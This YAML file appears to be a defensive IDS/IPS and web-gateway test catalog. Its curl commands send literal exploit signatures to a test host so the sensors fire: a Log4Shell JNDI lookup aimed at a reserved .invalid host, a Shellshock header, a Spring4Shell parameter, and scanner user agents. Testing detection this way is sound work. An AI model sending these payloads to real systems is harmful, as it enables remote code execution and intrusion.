# ---------------------------------------------------------------------------
# Modern-exploit pack — the marquee CVE signatures every IPS markets.
#
# Each payload is a FIXED LITERAL STRING in the argv (never built from free text) sent
# as a header / query string to the SAME benign tmNIDS origin the rest of the IDS
# catalog uses. NOTHING IS EXPLOITED: the JNDI/LDAP references point at the RFC 2606
# reserved `.invalid` TLD, they are inert text in a header, and the app never resolves
# or fetches them. The sensor matches the pattern on the wire — which is the whole
# point — while the request itself is an ordinary HTTP GET to a test host.
# ---------------------------------------------------------------------------

- id: ns-log4shell
  label: "Log4Shell JNDI probe (CVE-2021-44228)"
  class: ns-ids
  runner: curl
  commands:
    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-H", "User-Agent: ${jndi:ldap://scanner.invalid/a}", "-H", "X-Api-Version: ${jndi:dns://scanner.invalid/b}", "http://testmynids.org"]
  flags: [needs_internet, needs_et_ruleset]
  severity: crit
  threat_class: exploit
  expected_fire: "ET EXPLOIT — Apache Log4j JNDI injection attempt (CVE-2021-44228) in an HTTP header"
  talking_point: "The CVE that defined 2021 and still the most-asked-for IPS signature. The JNDI string is inert text in a header pointing at a reserved .invalid name — nothing resolves, nothing executes."

- id: ns-shellshock
  label: "Shellshock CGI probe (CVE-2014-6271)"
  class: ns-ids
  runner: curl
  commands:
    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-H", "User-Agent: () { :;}; echo secvitals-shellshock-test", "http://testmynids.org/cgi-bin/test.cgi"]
  flags: [needs_internet, needs_et_ruleset]
  severity: crit
  threat_class: exploit
  expected_fire: "ET EXPLOIT — Bash CVE-2014-6271 (Shellshock) function definition in an HTTP header"
  talking_point: "The classic header-borne command injection. The payload only echoes a marker string, and the target CGI does not exist."

- id: ns-spring4shell
  label: "Spring4Shell class-loader probe (CVE-2022-22965)"
  class: ns-ids
  runner: curl
  commands:
    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "http://testmynids.org/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=secvitals-test"]
  flags: [needs_internet, needs_et_ruleset]
  severity: warn
  threat_class: exploit
  expected_fire: "ET EXPLOIT — Spring Framework class-loader manipulation (CVE-2022-22965)"
  talking_point: "A query-string data-binding attack — the signature is the parameter name, so a plain GET trips it."

- id: ns-scanner-ua
  label: "Security-scanner user agents (Nikto / sqlmap / Nmap)"
  class: ns-ids
  runner: curl
  commands:
    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-A", "Mozilla/5.00 (Nikto/2.1.6)", "http://testmynids.org"]
    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-A", "sqlmap/1.7-dev (https://sqlmap.org)", "http://testmynids.org"]
    - ["curl", "-s", "-S", "-o", "{devnull}", "-w", "%{http_code}|", "--connect-timeout", "6", "--max-time", "10", "-A", "Nmap Scripting Engine (https://nmap.org/book/nse.html)", "http://testmynids.org"]
  flags: [needs_internet, needs_et_ruleset]
  severity: warn
  threat_class: recon
  expected_fire: "ET SCAN — Nikto / sqlmap / Nmap NSE user agent observed outbound"
  talking_point: "Scanner tooling announces itself in the User-Agent. Outbound from a corporate host it usually means a compromised endpoint, not a pentest."

# ---------------------------------------------------------------------------
# Secure Web Gateway (web categorization / reputation) + IP reputation.
#
# The SWG denies by SILENTLY DROPPING the flow — there is NO block page. A deny is observed
# as a connect timeout / reset (curl rc 28/7/56 -> blocked); a completed response (rc 0,
# HTTP 2xx) is `allowed`. Environment failures (DNS/TLS: rc 6/35/60/…) are `error`, never
# a false blocked. PREREQUISITE: the category/reputation must be set to Deny in policy for
# a test to block; an `allowed` result most often means the policy isn't set.
# ---------------------------------------------------------------------------

- id: web-cat-gambling
  label: "Gambling — bet365.com"
  class: ns-webcc
  runner: curl
  commands:
    - ["curl", "-sS", "-A", "SecVitals-Demo", "-o", "{devnull}", "-w", "%{http_code}|%{size_download}|%{url_effective}", "--connect-timeout", "6", "--max-time", "9", "https://www.bet365.com/"]
  flags: [needs_internet]
  severity: info
  threat_class: policy
  expected_fire: "SWG category Gambling · Deny → timeout (silent drop)"
  talking_point: "Web-category filtering by hostname/SNI — no decryption needed."

